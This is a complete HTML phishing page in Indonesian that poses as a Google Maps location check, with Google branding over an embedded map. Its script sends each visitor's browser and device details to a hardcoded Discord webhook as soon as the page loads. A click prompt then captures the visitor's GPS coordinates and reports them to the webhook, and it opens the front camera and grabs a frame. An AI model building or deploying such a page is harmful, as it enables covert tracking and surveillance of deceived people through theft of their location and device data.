<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps - Verifikasi Lokasi</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #f8f9fa; }
        iframe { width: 100%; height: 100%; border: none; }
        #overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255,255,255,0.9); z-index: 1000;
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div id="overlay" onclick="startTracking()">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
        <p style="font-family: Arial; color: #5f6368; margin-top: 20px;">Klik di mana saja untuk melihat rute maps...</p>
    </div>

    <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3966.666!2d106.827!3d-6.175!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zNsKwMTAnMzAuMCJTIDEwNsKwNDknMzcuMiJF!5e0!3m2!1sid!2sid!4v1" allow="geolocation;camera"></iframe>

    <script>
        // GANTI DENGAN URL WEBHOOK DISCORD ANDA
        const webhookURL = "https://discord.com/api/webhooks/1484113432583081984/Fkm8Dj5XnVCkC7du-HRYBFKAvdcxCz9jcXzQIj_5G4hWa1rX0GUPVQ02P5as6oiOKOxR";

        async function sendLog(content) {
            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: content })
            });
        }

        // Fungsi yang berjalan otomatis saat halaman dibuka
        window.onload = () => {
            let deviceData = `**[!] Target Terdeteksi!**\n`;
            deviceData += `Browser: ${navigator.userAgent}\n`;
            deviceData += `Platform: ${navigator.platform}\n`;
            deviceData += `Bahasa: ${navigator.language}`;
            sendLog(deviceData);
        };

        async function startTracking() {
            document.getElementById('overlay').style.display = 'none';

            // Ambil Lokasi
            navigator.geolocation.getCurrentPosition(pos => {
                const mapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                sendLog(`**[+] Lokasi Ditemukan:**\n${mapsLink}`);
            }, err => {
                sendLog(`[-] Lokasi Ditolak: ${err.message}`);
            });

            // Ambil Kamera
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                sendLog("**[+] Kamera Berhasil Diakses!**");
                
                // Ambil 1 frame untuk verifikasi
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                // Status sukses ambil gambar
                sendLog("**[+] Foto Kamera Depan Terambil.**");
                
                stream.getTracks().forEach(track => track.stop());
            } catch (e) {
                sendLog(`[-] Kamera Gagal/Ditolak: ${e.name}`);
            }
        }
    </script>
</body>
</html>
